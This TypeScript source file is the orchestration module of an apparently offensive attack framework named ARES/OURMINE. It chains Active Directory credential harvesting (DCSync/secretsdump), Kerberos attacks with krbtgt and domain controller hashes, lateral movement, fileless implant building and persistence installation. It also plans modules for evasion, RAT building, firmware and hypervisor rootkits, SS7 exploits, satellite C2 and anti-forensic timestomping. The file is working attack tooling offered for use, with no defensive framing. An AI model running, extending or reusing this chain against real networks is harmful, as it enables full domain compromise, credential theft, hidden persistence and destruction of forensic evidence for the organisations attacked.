/**
 * @module ares/_chain
 * Prerequisite-aware ARES auto-chaining — cred harvest → Kerberos → lateral → persistence.
 */
import { CredentialGraph, type CredentialNode } from "../credential_graph.ts"
import { runAutonomousCredAccess } from "../cred_access_auto.ts"
import { runKerberosAdvanced } from "./kerberos_advanced.ts"
import { runLateralScale } from "./lateral_scale.ts"
import { buildFilelessImplant } from "./fileless_implant.ts"
import { installAdvancedPersistence } from "./persistence_advanced.ts"
import { step, type ExecStep } from "./_integrations.ts"

export interface AdChainContext {
  domain: string
  domainSid?: string
  krbtgtHash?: string
  dcMachineHash?: string
  dcHost?: string
  dcName?: string
  hasCredentials: boolean
  canKerberos: boolean
  canLateral: boolean
  canRemoteFileless: boolean
}

export interface ChainPhaseResult {
  phase: string
  success: boolean
  summary: string
  skipped?: boolean
  skipReason?: string
}

export interface AresAutoChainResult {
  context: AdChainContext
  phases: ChainPhaseResult[]
  steps: ExecStep[]
  summary: string
}

export interface OrchestratorModulePlan {
  name: string
  run: boolean
  reason: string
}

export function resolveAdChainContext(cg: CredentialGraph, opts: { domain?: string; target?: string } = {}): AdChainContext {
  const ctx = cg.getAdContext()
  const domain = opts.domain ?? ctx.domain ?? process.env.OURMINE_AD_DOMAIN ?? "CORP.LOCAL"
  const krbtgtHash = cg.findKrbtgtHash(domain) ?? process.env.OURMINE_KRBTGT_HASH
  const dcMachineHash = cg.findDcMachineHash(domain) ?? process.env.OURMINE_DC_MACHINE_HASH
  const domainSid = ctx.domainSid ?? process.env.OURMINE_DOMAIN_SID
  const hasEnvCreds = !!(process.env.OURMINE_AD_USER && process.env.OURMINE_AD_PASS)
  const hasGraphCreds = cg.listCredentials().some((c) => c.type === "nthash" || c.type === "password")
  const hasCredentials = hasGraphCreds || hasEnvCreds
  const canKerberos = !!(krbtgtHash || dcMachineHash || hasCredentials)
  const canLateral = hasCredentials
  const target = opts.target ?? ctx.dcHost ?? "127.0.0.1"
  const canRemoteFileless = canLateral && target !== "127.0.0.1" && target !== "localhost"

  return {
    domain,
    domainSid,
    krbtgtHash,
    dcMachineHash,
    dcHost: ctx.dcHost ?? (target !== "127.0.0.1" ? target : undefined),
    dcName: ctx.dcName,
    hasCredentials,
    canKerberos,
    canLateral,
    canRemoteFileless,
  }
}

export function planOrchestratorModules(ctx: AdChainContext, target: string): OrchestratorModulePlan[] {
  const labFlash = process.env.OURMINE_LAB_FLASH_WRITE === "1"
  const esxiLikely = target !== "127.0.0.1" && target !== "localhost"
  return [
    { name: "ares_evasion_engine", run: true, reason: "always — establish bypass baseline" },
    { name: "ares_fileless_implant", run: true, reason: ctx.canRemoteFileless ? "remote creds available" : "local build path" },
    { name: "ares_zero_day_fuzzer", run: true, reason: "lab harness / target fuzz" },
    { name: "ares_rat_builder", run: true, reason: "C2 artifact generation" },
    { name: "ares_kerberos_advanced", run: ctx.canKerberos, reason: ctx.canKerberos ? "krbtgt/dc hash or AD creds present" : "skip — no krbtgt/dc/creds" },
    { name: "ares_lateral_scale", run: ctx.canLateral, reason: ctx.canLateral ? "lateral creds in graph/env" : "skip — no lateral creds" },
    { name: "ares_persistence_advanced", run: ctx.canLateral || ctx.canKerberos, reason: "post-auth persistence when creds exist" },
    { name: "ares_supply_chain_implant", run: true, reason: "project/registry audit" },
    { name: "ares_cloud_native", run: true, reason: "cloud token probes" },
    { name: "ares_network_exploit", run: true, reason: "responder/bgp recon" },
    { name: "ares_firmware_implant", run: true, reason: labFlash ? "flash write enabled" : "audit/read only" },
    { name: "ares_hypervisor_rootkit", run: esxiLikely, reason: esxiLikely ? `ESXi probe on ${target}` : "skip — no remote ESXi target" },
    { name: "ares_airgap_bridge", run: true, reason: "channel materialization" },
    { name: "ares_hardware_implant", run: true, reason: "USB/SDR probes" },
    { name: "ares_satellite_c2", run: true, reason: process.env.OURMINE_ROCKBLOCK_KEY ? "RockBLOCK key set" : "channel scaffolds" },
    { name: "ares_ss7_exploit", run: esxiLikely || !!process.env.OURMINE_SS7_HOST, reason: process.env.OURMINE_SS7_HOST ? "SS7 lab host configured" : "telecom audit only" },
    { name: "ares_ai_ml_attacks", run: true, reason: "AI/ML surface probes" },
    { name: "ares_anti_forensics_advanced", run: true, reason: "cleanup/timestomp path" },
  ]
}

export async function harvestAdCredentials(opts: {
  target: string
  domain?: string
  live: boolean
  credGraph: CredentialGraph
}): Promise<{ added: number; phases: ChainPhaseResult[] }> {
  const phases: ChainPhaseResult[] = []
  const ctx = resolveAdChainContext(opts.credGraph, { domain: opts.domain, target: opts.target })
  if (ctx.krbtgtHash) {
    phases.push({ phase: "cred_harvest", success: true, summary: "krbtgt already in graph", skipped: true, skipReason: "krbtgt present" })
    return { added: 0, phases }
  }

  const results = await runAutonomousCredAccess({
    target: opts.target,
    domain: ctx.domain,
    live: opts.live,
    credGraph: opts.credGraph,
  })
  const added = opts.credGraph.listCredentials().length
  const ok = results.some((r) => r.success)
  phases.push({
    phase: "cred_harvest",
    success: ok,
    summary: ok ? `DCSync/secretsdump succeeded (${results.filter((r) => r.success).length} method(s))` : "cred harvest failed or unavailable",
  })
  opts.credGraph.save()
  return { added, phases }
}

export async function runAresAutoChain(opts: {
  target: string
  domain?: string
  live: boolean
  credGraph?: CredentialGraph
  skipHarvest?: boolean
}): Promise<AresAutoChainResult> {
  const cg = opts.credGraph ?? CredentialGraph.load()
  const phases: ChainPhaseResult[] = []
  const steps: ExecStep[] = []

  if (!opts.skipHarvest) {
    const harvest = await harvestAdCredentials({ ...opts, credGraph: cg })
    phases.push(...harvest.phases)
  }

  const ctx = resolveAdChainContext(cg, { domain: opts.domain, target: opts.target })

  if (ctx.canKerberos) {
    try {
      const r = await runKerberosAdvanced({
        live: opts.live,
        domain: ctx.domain,
        domainSid: ctx.domainSid,
        krbtgtHash: ctx.krbtgtHash,
        dcMachineHash: ctx.dcMachineHash,
        dc: ctx.dcName ?? ctx.dcHost,
      })
      const ok = r.executed || r.steps.some((s) => s.success)
      phases.push({ phase: "kerberos_chain", success: ok, summary: r.summary })
      steps.push(step("kerberos_chain", ok, r.summary))
    } catch (err) {
      phases.push({ phase: "kerberos_chain", success: false, summary: String((err as Error).message).slice(0, 200) })
    }
  } else {
    phases.push({ phase: "kerberos_chain", success: false, summary: "skipped — no krbtgt/dc/creds", skipped: true, skipReason: "canKerberos=false" })
  }

  if (ctx.canLateral) {
    try {
      const r = await runLateralScale({ live: opts.live, target: opts.target, domain: ctx.domain })
      const ok = r.steps.some((s) => s.success)
      phases.push({ phase: "lateral_chain", success: ok, summary: r.summary })
      steps.push(step("lateral_chain", ok, r.summary))
    } catch (err) {
      phases.push({ phase: "lateral_chain", success: false, summary: String((err as Error).message).slice(0, 200) })
    }
  } else {
    phases.push({ phase: "lateral_chain", success: false, summary: "skipped — no lateral creds", skipped: true, skipReason: "canLateral=false" })
  }

  if (ctx.canRemoteFileless || ctx.canLateral) {
    try {
      const r = await buildFilelessImplant({
        live: opts.live,
        target: ctx.canRemoteFileless ? opts.target : undefined,
        domain: ctx.domain,
      })
      phases.push({ phase: "fileless_chain", success: r.built || r.executed, summary: r.summary })
      steps.push(step("fileless_chain", r.built || r.executed, r.summary))
    } catch (err) {
      phases.push({ phase: "fileless_chain", success: false, summary: String((err as Error).message).slice(0, 200) })
    }
  }

  if (ctx.canKerberos || ctx.canLateral) {
    try {
      const r = await installAdvancedPersistence({ live: opts.live })
      phases.push({ phase: "persistence_chain", success: r.installed > 0 || r.steps.some((s) => s.success), summary: r.summary })
    } catch (err) {
      phases.push({ phase: "persistence_chain", success: false, summary: String((err as Error).message).slice(0, 200) })
    }
  }

  cg.save()
  const ran = phases.filter((p) => !p.skipped && p.success).length
  return {
    context: ctx,
    phases,
    steps,
    summary: `ARES auto-chain: ${ran}/${phases.filter((p) => !p.skipped).length} phase(s) succeeded`,
  }
}

export function credentialSummary(creds: CredentialNode[]): string {
  const roles = creds.map((c) => c.role ?? c.username ?? c.type).slice(0, 8)
  return roles.join(", ")
}

export default {
  resolveAdChainContext,
  planOrchestratorModules,
  harvestAdCredentials,
  runAresAutoChain,
}
